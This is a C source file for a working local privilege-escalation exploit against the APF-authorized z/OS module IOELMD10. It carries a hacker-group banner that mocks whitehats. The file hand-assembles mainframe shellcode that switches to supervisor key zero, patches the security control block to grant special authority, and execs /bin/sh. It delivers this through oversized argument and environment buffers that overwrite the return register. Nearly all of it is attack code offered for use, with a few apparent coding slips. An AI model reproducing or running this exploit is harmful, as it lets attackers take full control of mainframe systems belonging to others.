/*  
 *    oooOOOOOOOOOOO"                         - one mantrain loaded with PWNAGE!
 *    o   ____            ::::::::::::::::::::  :::::::::::::::::  __|-----|__
 *    Y_,_|[]| --++++++   | WHiTEHATS GETTiN |  | iT UP THE ASS |  |  [] []  | - since 2001
 *    {|_|_|__|;|______|;;|__________________|;;|_______________|;;|_________|;
 *          /oo--OOoo      oo   oo oo      oo    oo oo  oo oo oo    oo     oo
 *        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 * :MANTRAiN: pRouDLy PeRVeRZeDLy pReSeNTz ... DeFeNeStRaTe.C!@#
 *            - PART OF PROJECT zER/oDAYs - MAiNTRAiNING MANFRAMEZ 2 OuTAPT THE CHiNESE
 * z/OS OMVS local exploit for APF authorized load module IOELMD10 8===D APF 4 APT 8===D
 *
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>

#define VICTIM "/usr/lpp/dfs/global/bin/IBM/IOELMD10"
#define OVERLAY_R14_ADDR_SKEW_BYTES 1

#define NUM_ARGS 1
#define ARG_LEN 0x1000
#define ARG_SIZE 0x2000

#define NUM_ENVS 1
#define ENV_LEN 0x1000
#define ENV_SIZE 0x2000

#define R0 0
#define R1 1
#define R2 2 
#define R3 3
#define R4 4
#define R5 5
#define R6 6
#define R7 7
#define R8 8
#define R9 9
#define R10 10
#define R11 11
#define R12 12
#define R13 13
#define R14 14
#define R15 15

#define INS_RR(C,X,Y) (C), ( ((X)&0xf) <<4 ) | ( (Y)&0xf ) 
#define INS_RX(C,X,Y,Z) (C),(((X)&0xf)<<4),((((Y)&0xf)<<4)|(((Z)>>8)&0xf)), ((Z)&0xff)

#define SubReg(X,Y) INS_RR( 0x1b, (X), (Y) )
#define AddReg(X,Y) INS_RR( 0x1a, (X), (Y) )
#define OrImmLowLow(X,Y) 0xa5,0x0b|( ( (X)&0xf ) <<4),( ( (Y) >>8 )&0xff ),( (Y) &0xff )

#define SVC(X) 0x0a,((X)&0xff)

#define BranchAndLinkReg(X,Y) INS_RR(0x05, (X), (Y) )
#define BranchAndStackReg(X,Y) INS_RR(0x0D, (X), (Y) )

#define BranchRelativeAndSave(X,Y) 0xa7,( (( (X)&0xf )<<4)|5),(((Y)>>8)&0xff),((Y)&0xff)


#define LoadReg(X,Y) INS_RR(0x18, (X), (Y))
#define StoreReg(X,Y,Z) INS_RX(0x50,(X),(Y),(Z))
#define StoreChar(X,Y,Z) INS_RX(0x42,(X),(Y),(Z))
#define Load(X,Y,Z) INS_RX(0x58,(X),(Y),(Z))
#define LoadHalfwordImm(X,Y) 0xa7,( (( (X)&0xf )<<4)|8),(((Y)>>8)&0xff),((Y)&0xff)
#define ShiftRightLogical(X,Y,Z) 0x88,(((X)&0xf)<<4),(((Y)&0xf)<<4)|(((Z)>>8)&0xf),((Z)&0xff)


#define HCF_STUX() 0xf0,0x0f,0xc7,0xc8
#define HCF_ZERO() 0x00,0x00,0x00,0x00

#define NOP() SR_Rx_Ry(9,9)



#define FOURCC(A,B,C,D) ( (unsigned int)(((A)<<24)|((B)<<16)|((C)<<8)|((D)&0xff))&0xffFFffFF) ) 


unsigned char shellcode_full[] =
{
        SubReg(R1,R1),
        LoadHalfwordImm(R1,0x3c),
        SVC(0x6b),                          /* MODESET MODE=SUP,KEY=ZERO        */
        
        Load(R15,0,0x0224),                 /* ASCBPVT                          */
        Load(R15,R15,0x6c),                 /* ASCBASXB                         */
        Load(R15,R15,0xc8),                 /* ASXBACEE                         */
        
        LoadHalfwordImm(R1,0x0303),
        StoreChar(R1,R15,38),               /* X'03' => ACEEFLG1                */

        SubReg(R1,R1),
        LoadHalfwordImm(R1,0x24),
        SVC(0x6b),                          /* MODESET MODE=PROB,KEY=NZERO      */

        Load(R15,0,0x10),                   /* CVT                              */
        Load(R15,R15,544),                  /* CVTCSRT                          */
        Load(R15,R15,24),                   /* CSR slot                         */
        Load(R15,R15,228),                  /* BPX1EXC                          */

        SubReg(R14,R14),                    /* 0 => R14; ret addr of BPX1EXC    */
        BranchAndSaveReg(R1,R15),           /* params => R1; invoke BPX1EXC     */

};

struct _shellcode_BPX1EXC_Params
{
  void *pPathLen;
  void *pPathName;
  void *pArgCount; 
  void *pArgLenList;
  void *pArgDataList;
  void *pEnvCount;
  void *pEnvLenList;
  void *pEnvDataList;
  void *pExitAddr;
  void *pExitParamListAddr;
  void *pRetVal;
  void *pRetCode;
  void *pRsnCode;

  unsigned int PathLen;
  unsigned char PathName[64];
  unsigned int ArgCount;
  unsigned int *ArgLenList[2]; 
  unsigned char *ArgDataList[2];
  unsigned int EnvCount;
  unsigned int *EnvLenList[2];
  unsigned char *EnvDataList[2];
  void *ExitAddr;
  void *ExitParamListAddr;
  unsigned int RetVal;
  unsigned int RetCode;
  unsigned int RsnCode;

};

void *Build_shellcode_BPX1EXC_Params(unsigned int BaseAddr, unsigned int *pOutLen)
{
  struct _shellcode_BPX1EXC_Params *pParams;
  struct _shellcode_BPX1EXC_Params *pBase;

  pParams = malloc(sizeof(*pParams));
  memset(pParams, 0xc1, sizeof(*pParams));

  pBase =  (struct _shellcode_BPX1EXC_Args *)BaseAddr;

  pParams->pPathLen               = &pBase->PathLen;
  pParams->pPathName              = &pBase->PathName;
  
  pParams->pArgCount              = &pBase->ArgCount;
  pParams->pArgLenList            = &pBase->ArgLenList;
  pParams->pArgDataList           = &pBase->ArgDataList;

  pParams->pEnvCount              = &pBase->EnvCount;
  pParams->pEnvLenList            = &pBase->EnvLenList;
  pParams->pEnvDataList           = &pBase->EnvDataList;

  pParams->pExitAddr              = &pBase->ExitAddr;
  pParams->pExitParamListAddr     = &pBase->ExitParamListAddr;

  pParams->pRetVal                = &pBase->RetVal;
  pParams->pRetCode               = &pBase->RetCode;
  pParams->pRsnCode               = &pBase->RsnCode;
  

  memset(pParams->PathName, 0, sizeof(pParams->PathName));
  memcpy(pParams->PathName, "/bin/sh", 7);
  pParams->PathLen = 7;

  pParams->ArgCount = 1;
  pParams->ArgLenList[0] = &pBase->PathLen;
  pParams->ArgLenList[1] = NULL;
  pParams->ArgDataList[0] = &pBase->PathName;
  pParams->ArgDataList[1] = NULL;
  pParams->EnvCount = 0;
  pParams->EnvLenList[0] = pParams->EnvLenList[1] = NULL;
  pParams->EnvDataList[0] = pParams->EnvLenList[1] = NULL;
  pParams->ExitAddr = pParams->ExitParamListAddr = NULL;
  
  pParams->RetVal = pParams->RetCode = pParams->RsnCode = 0xdeadbabe;

  if (pOutLen != NULL) *pOutLen = sizeof(*pParams);

  return pParams;
}


typedef void BPXSVC();
#pragma linkage(BPXSVC,OS)
/* 228 */
void (*BPX1EXC)(        unsigned int    *Pathname_length, 
                        unsigned char   *Pathname, 
                        unsigned int    *Argument_count, 
                        unsigned int    *Argument_length_list, 
                        unsigned char  **Argument_list, 
                        unsigned int    *Environment_count, 
                        unsigned int    *Environment_data_length, 
                        unsigned char  **Environment_data_list, 
                        void           (*Exit_routine_address)(), 
                        void            *Exit_parameter_list_address, 
                        unsigned int    *Return_value, 
                        unsigned int    *Return_code, 
                        unsigned int    *Reason_code);

#define STARTWALK(PTR)          do { (PTR) = (unsigned char *)0; } while (0) 
#define WALK(PTR,OFF)           do { memcpy( &(PTR), &(PTR)[(OFF)], sizeof(PTR) ); } while (0)
#define SETPTR(DST,SRC,OFF)     do { memcpy( &(DST), &(SRC)[(OFF)], sizeof(DST) ); } while (0)

void ResolveImports(void)
{
        unsigned char *cp;

        STARTWALK(cp);
        WALK(cp, 16);                   /* CVT           */
        WALK(cp, 544);                  /* CSRTABLE      */
        WALK(cp, 24);                   /* CSR slot      */
        SETPTR(BPX1EXC, cp, 228);       
        printf("BPX1EXC resolved to %p\n", BPX1EXC);   
}

unsigned char ArgBuf[ARG_SIZE];
unsigned char *ArgDataList[NUM_ARGS]; 
unsigned int ArgCount, *ArgLenList[NUM_ARGS]; 
unsigned char *EnvDataList[NUM_ARGS]; 
unsigned int *EnvLenList[NUM_ARGS]; 
unsigned int EnvCount;
unsigned char *PathName;
unsigned int PathLen;
void (*ExitAddr)();
void *ExitParamList[] = { NULL };
void *ExitParamListAddr;
unsigned int RetVal;
unsigned int RetCode;
unsigned int RsnCode;                                                                                                      

unsigned int OverlayR14Addr;
unsigned int PayloadAddr, PayloadParamsAddr, OverlayR14Addr;
void *pPayloadParams;
unsigned int PayloadParamsLen;





void sighandler(int sig)
{
        printf("got sig %d\n", sig);
}

extern char **environ;


int main(int argc, char *argv[])
{
        unsigned int i;
        unsigned char *pszLibPath;

        ArgCount = NUM_ARGS; 
        EnvCount = NUM_ARGS;


        PayloadAddr = (unsigned int)environ[0];
        printf("addr of environ base is X'%.8X'\n", PayloadAddr);
        PayloadAddr += 8 + 2;
        PayloadParamsAddr = OverlayR14Addr = PayloadAddr;
        OverlayR14Addr |= 0x80000000;
        printf("payload addr is X'%.8X'; R14 overlay addr is X'%.8X'\n", PayloadAddr, OverlayR14Addr); 

        OverlayR14Addr = ((OverlayR14Addr >> (8*OVERLAY_R14_ADDR_SKEW_BYTES)) )|(( OverlayR14Addr ) << (32-(8*OVERLAY_R14_ADDR_SKEW_BYTES)));
#if 0
        printf("%.8x\n", OverlayR14Addr);
        printf("%.2X %.2X %.2X %.2X\n", ((unsigned char *)&OverlayR14Addr)[0], ((unsigned char *)&OverlayR14Addr)[1], ((unsigned char *)&OverlayR14Addr)[2], ((unsigned char *)&OverlayR14Addr)[3]);
#endif



        ArgDataList[0] = malloc(ARG_SIZE+1);
        ArgLenList[0] = malloc(sizeof(unsigned int)); 
        *ArgLenList[0] = ARG_LEN;
        i = 0;
        if ((ARG_LEN&3)!=0)
        {
                *(unsigned int *)(ArgDataList[0]) = *(unsigned int *)"bBcC";
                i += 3-(ARG_LEN&3);
        }
        while (i < ARG_LEN)
        {
                *(unsigned int *)(ArgDataList[0] + i) = OverlayR14Addr;
                i += 4; 
        }


        

        EnvDataList[0] = malloc(8+4+2+ENV_SIZE+1);
        EnvLenList[0] = malloc(sizeof(unsigned int));
        *EnvLenList[0] = ENV_LEN;
        i = 0;
        memcpy(EnvDataList[0], "PAYLOAD=", 8); i += 8;

        EnvDataList[0][i ++] = '2';
        EnvDataList[0][i ++] = '3';

        memcpy(EnvDataList[0] + i, shellcode_full, sizeof(shellcode_full)); i += sizeof(shellcode_full);
        PayloadParamsAddr = (unsigned int)environ[0] + i;
        printf("payload params addr: X'%.8X'\n", PayloadParamsAddr);

                                                                    
        pPayloadParams = Build_shellcode_BPX1EXC_Params(PayloadParamsAddr, &PayloadParamsLen);
        printf("payload params len: %u\n", PayloadParamsLen);
        
        memcpy(EnvDataList[0] + i, pPayloadParams, PayloadParamsLen); i += PayloadParamsLen;

        while (i <= ENV_LEN - 4)
        {
                *(unsigned int *)(EnvDataList[0] + i) = 0xf00fc7c8;
                i += 4;
        }

        while (i < ENV_LEN) EnvDataList[0][i ++] = "pP"[i&1];     
         
        
        ArgCount = EnvCount = 1;

        PathName = (memcmp(environ[0], "PAYLOAD=", 8) == 0)? strdup(VICTIM) : argv[0];
        PathLen = strlen(PathName);

        ExitAddr = NULL; 
        ExitParamListAddr = ExitParamList;
        RetVal = RetCode = RsnCode = 0xdeadbeef;

        ResolveImports();

        printf("execing %s\n", PathName); 

        ((BPXSVC *)BPX1EXC)(
                &PathLen, &PathName[0], 
                &ArgCount, ArgLenList, ArgDataList, 
                &EnvCount, EnvLenList, EnvDataList, 
                &ExitAddr, &ExitParamListAddr, 
                &RetVal, &RetCode, &RsnCode);
        fprintf(stderr, "exec (OMVS BPX1EXC) failed; RetVal %d, Errno %u, RsnCode X'%x'. \n", RetVal, RetCode, RsnCode);
        if (RetVal != 0 && RetCode != 0) fprintf(stderr, "exec (OMVS BPX1EXC): %s\n", strerror(RetCode));
        
        return 0;
}
